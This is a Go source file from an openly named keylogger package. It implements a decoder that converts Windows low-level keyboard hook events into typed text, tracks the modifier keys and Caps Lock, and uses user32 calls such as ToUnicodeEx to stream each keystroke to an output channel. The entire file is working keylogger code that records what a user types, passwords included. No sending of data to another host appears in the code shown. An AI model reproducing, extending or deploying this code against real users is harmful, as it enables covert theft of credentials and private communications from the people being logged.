package keylogger

import (
	"syscall"
	"unicode"

	"github.com/Spriithy/gkl/types"
	"github.com/Spriithy/gkl/user32"
)

type keyStrokeDecoder struct {
	input         chan *KeyboardEvent
	output        chan string
	shiftState    bool
	capsState     bool
	menuState     bool
	ctrlState     bool
	keyboardState [256]uint8
}

func newKeyStrokeDecoder(input chan *KeyboardEvent, output chan string) *keyStrokeDecoder {
	return &keyStrokeDecoder{
		input:  input,
		output: output,
	}
}

func (ksd *keyStrokeDecoder) Listen() {
	for {
		event := <-ksd.input

		user32.GetKeyboardState(types.PBYTE(&ksd.keyboardState[0]))

		/*
			for i := range ksd.keyboardState {
				ksd.keyboardState[i] = byte((user32.GetAsyncKeyState(i) >> 8) & 0xff)
			}
		*/

		if ksd.shiftState {
			ksd.keyboardState[types.VK_SHIFT] = 0x80
		}

		if ksd.menuState {
			ksd.keyboardState[types.VK_MENU] = 0x80
		}

		if ksd.ctrlState {
			ksd.keyboardState[types.VK_CONTROL] = 0x80
		}

		if ksd.capsState {
			ksd.keyboardState[types.VK_CAPITAL] = 0x01
		}

		var buf [4]uint16
		unicodeErr := user32.ToUnicodeEx(
			types.UINT(event.HookStruct.VkCode),
			types.UINT(event.HookStruct.ScanCode),
			types.PBYTE(&ksd.keyboardState[0]),
			types.LPCWSTR(&buf[0]),
			cap(buf),
			types.UINT(event.HookStruct.Flags),
			event.Layout,
		) <= 0

		key := syscall.UTF16ToString(buf[:])

		switch {
		case event.isControl() && event.isDown():
			ksd.ctrlState = true
			// ksd.output <- "(CTRL)"

		case event.isControl() && event.isUp():
			ksd.ctrlState = false

		case event.isShift() && event.isDown():
			ksd.shiftState = true

		case event.isShift() && event.isUp():
			ksd.shiftState = false

		case event.isMenu() && event.isDown():
			ksd.menuState = true

		case event.isMenu() && event.isUp():
			ksd.menuState = false

		case event.isCaps() && event.isDown():
			ksd.capsState = !ksd.capsState

		case event.isNumLock() && event.isDown():
			ksd.output <- "(NUMLOCK)"

		case event.isTab() && event.isDown():
			ksd.output <- "(TAB)"

		case event.isTab() && event.isSysKeyDown():
			/*
				if ksd.shiftState {
					ksd.output <- "(ALT+SHIFT+TAB)"
				} else {
					ksd.output <- "(ALT+TAB)"
				}
			*/

		case event.isEscape() && event.isDown():
			// ksd.output <- "(ESC)"

		case event.isBackspace() && event.isDown():
			ksd.output <- "(BACKSPACE)"

		case event.isReturn() && event.isDown():
			ksd.output <- "↩\n"
		}

		if !unicodeErr && unicode.IsPrint(rune(key[0])) && event.isDown() {
			ksd.output <- key
		}
	}
}
